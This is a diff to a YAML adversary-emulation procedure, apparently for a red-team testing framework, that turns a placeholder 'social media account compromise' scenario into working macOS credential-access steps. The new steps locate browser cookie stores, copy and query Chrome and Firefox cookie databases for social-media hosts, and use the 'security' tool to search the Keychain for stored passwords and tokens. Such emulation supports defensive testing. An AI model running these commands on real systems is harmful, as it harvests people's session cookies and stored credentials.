@@ -5,7 +5,9 @@ name: Social Media Account Compromise
 authors:
 - Claude Code
 description: |
-  Exploit compromised social media accounts to gain access to macOS systems
+  Search for social media tokens and credentials stored on a macOS system. Extracts
+  cookies from browser data directories, searches for social media session tokens,
+  and queries the macOS Keychain for stored social media credentials.
 mitre:
   tactics:
   - TA0001 Initial Access
@@ -15,50 +17,80 @@ requirements:
   platforms:
   - os: darwin
 args:
-- name: target_account
-  description: Target account username or identifier
+- name: browser
+  description: Primary browser to target for cookie and token extraction
   type: string
-- name: password_list
-  description: Path to password list for authentication attempts
-  type: string
-- name: leaked_creds_file
-  description: Path to file with compromised social media credentials
-  type: string
-- name: oauth_token
-  description: OAuth token from compromised social media account
-  type: string
+  default: chrome
 steps:
-- name: identify_social_media_links
-  description: Identify social media accounts linked to target
+- name: search_browser_social_media_data
+  description: Search browser data directories for social media cookies and tokens
   inline: |
-    echo "Identifying social media accounts for: ${target_account}"
-    # Dry run: simulate discovery
-    echo "Found potential social media connections"
-- name: load_compromised_credentials
-  description: Load compromised social media credentials
+    echo "=== Searching Browser Data for Social Media Tokens ==="
+    echo "--- Cookie databases ---"
+    find "$HOME/Library/Application Support" -name "Cookies" -o -name "Cookies.binarycookies" -o -name "cookies.sqlite" 2>/dev/null | while read -r f; do
+      echo "Found: $f"
+      ls -la "$f"
+    done
+    echo "--- Local Storage databases ---"
+    find "$HOME/Library/Application Support" -name "*.sqlite" -path "*/Local Storage/*" 2>/dev/null | while read -r f; do
+      echo "Found local storage: $f"
+    done
+    echo "--- Web Data databases ---"
+    find "$HOME/Library/Application Support" -name "Web Data" 2>/dev/null | while read -r f; do
+      echo "Found web data: $f"
+    done
+- name: extract_browser_cookies
+  description: Extract social media cookies from Chrome, Safari, and Firefox
   inline: |
-    echo "Loading compromised social media credentials"
-    if [ -f "${leaked_creds_file}" ]; then
-      wc -l < "${leaked_creds_file}" | xargs echo "Compromised accounts:"
+    echo "=== Extracting Social Media Cookies ==="
+    # Chrome cookies
+    chrome_cookies="$HOME/Library/Application Support/Google/Chrome/Default/Cookies"
+    if [ -f "$chrome_cookies" ]; then
+      echo "--- Chrome Cookies ---"
+      cp "$chrome_cookies" /tmp/ttp_chrome_cookies.db 2>/dev/null
+      sqlite3 /tmp/ttp_chrome_cookies.db "SELECT host_key, name, path FROM cookies WHERE host_key LIKE '%twitter%' OR host_key LIKE '%facebook%' OR host_key LIKE '%instagram%' OR host_key LIKE '%linkedin%' OR host_key LIKE '%github%' OR host_key LIKE '%x.com%' LIMIT 30;" 2>/dev/null || echo "Could not query Chrome cookies (may be locked)"
+      rm -f /tmp/ttp_chrome_cookies.db
+    else
+      echo "Chrome cookies database not found"
     fi
-- name: exploit_oauth_tokens
-  description: Attempt to exploit OAuth tokens from social media
-  inline: |
-    echo "Attempting to exploit social media OAuth tokens"
-    if [ -n "${oauth_token}" ]; then
-      echo "Testing OAuth token access"
+    # Firefox cookies
+    ff_profiles="$HOME/Library/Application Support/Firefox/Profiles"
+    if [ -d "$ff_profiles" ]; then
+      echo "--- Firefox Cookies ---"
+      find "$ff_profiles" -name "cookies.sqlite" 2>/dev/null | while read -r db; do
+        cp "$db" /tmp/ttp_ff_cookies.db 2>/dev/null
+        sqlite3 /tmp/ttp_ff_cookies.db "SELECT host, name, path FROM moz_cookies WHERE host LIKE '%twitter%' OR host LIKE '%facebook%' OR host LIKE '%instagram%' OR host LIKE '%linkedin%' OR host LIKE '%github%' OR host LIKE '%x.com%' LIMIT 30;" 2>/dev/null || echo "Could not query Firefox cookies"
+        rm -f /tmp/ttp_ff_cookies.db
+      done
+    else
+      echo "Firefox profiles not found"
     fi
-- name: attempt_system_access
-  description: Use compromised social media credentials for system access
+    # Safari cookies
+    safari_cookies="$HOME/Library/Cookies/Cookies.binarycookies"
+    if [ -f "$safari_cookies" ]; then
+      echo "--- Safari Cookie File Found ---"
+      ls -la "$safari_cookies"
+      echo "(Safari uses binary cookie format - file located for analysis)"
+    else
+      echo "Safari cookies file not found"
+    fi
+- name: search_keychain_social_media
+  description: Search macOS Keychain for stored social media credentials
   inline: |
-    echo "Attempting system access via compromised social credentials"
-    # Dry run: simulate authentication
-    echo "Testing social media linked authentication"
+    echo "=== Searching Keychain for Social Media Entries ==="
+    services=("twitter" "facebook" "instagram" "linkedin" "github" "x.com" "meta" "tiktok" "reddit" "discord" "slack")
+    for svc in "${services[@]}"; do
+      echo "--- Searching for '$svc' ---"
+      security find-generic-password -s "$svc" 2>&1 | grep -v "could not be found" || true
+      security find-internet-password -s "$svc" 2>&1 | grep -v "could not be found" || true
+    done
+    echo "--- Searching for OAuth tokens in keychain ---"
+    security find-generic-password -s "com.google.Chrome" 2>&1 | grep -v "could not be found" || true
+    security find-generic-password -s "com.apple.Safari" 2>&1 | grep -v "could not be found" || true
   cleanup:
     inline: |
-      echo "Revoking social media OAuth tokens"
-
-      echo "Resetting compromised account passwords"
+      echo "Removing temporary cookie databases"
+      rm -f /tmp/ttp_chrome_cookies.db /tmp/ttp_ff_cookies.db
 tests:
 - name: dry_run_test
   dry_run: true
